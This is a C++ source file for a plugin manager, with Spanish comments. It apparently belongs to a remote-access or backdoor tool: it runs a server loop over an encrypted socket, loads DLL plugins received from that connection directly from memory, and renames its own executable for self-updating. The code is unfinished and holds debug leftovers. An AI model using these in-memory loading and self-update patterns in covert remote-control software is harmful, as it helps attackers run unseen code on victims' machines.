
#undef UNICODE
#include "PluginManager.h"
#include "plugininterface.h"
#include <stdio.h>

PluginManager PlugMgr;
plugin* PluginManager::pluginList;
uint PluginManager::lastID;

class PluginManagerInterfacePrivate :public pluginManagerInterface{
        PluginManager* mgr;
    public:
        PluginManagerInterfacePrivate(PluginManager& mgr);
        virtual int sendData(const char* data,uint size);
        virtual int setErrorCode(uint code);
};

PluginManager::PluginManager(){
}

uint PluginManager::run(SOCKET hConexion, HCRYPTKEY hKey, LoaderFunTable &lFunc){
    RPEP client(hConexion,hKey);
    printf("despues de client\n");

    this->lFunc = &lFunc;

    MessageBoxA(0, "PluginManager::run", "DLL Message", MB_OK | MB_ICONINFORMATION);
    return client.serverLoop();
}

bool PluginManager::updateServer(DArray& newServer){
    char FileName[1024];
    char FileNameNew[1024];
    long FilenameSize;
    FilenameSize = GetModuleFileName(0,FileName,sizeof(FileName)-1);

    strcpy(FileNameNew,FileName);
    FileNameNew[FilenameSize] = '_';
    FileNameNew[FilenameSize+1] = 0;

    MoveFile(FileName,FileNameNew);

    return true;
}
bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
    pgetInterface getInterface;
    HINSTANCE hModule;
    plugin* newPlugin;
    bool result = false;

    newPlugin = new plugin();
    //Cargamos el plugin
    newPlugin->hModule = hModule = lFunc->LoadLibraryFromMemoy(pluginModule->PluginModule,"");
    //Buscamos las funciones exportadas
    getInterface = (pgetInterface)GetProcAddress(hModule,"getInterface");
    if((newPlugin->plugInterface = getInterface())){
        newPlugin->ID = pluginModule->PluginID;
        pluginList = newPlugin;
        result = true;
    }else delete newPlugin;
    return result;
}
plugin* PluginManager::getPluginById(ulong id){
    return pluginList;
}
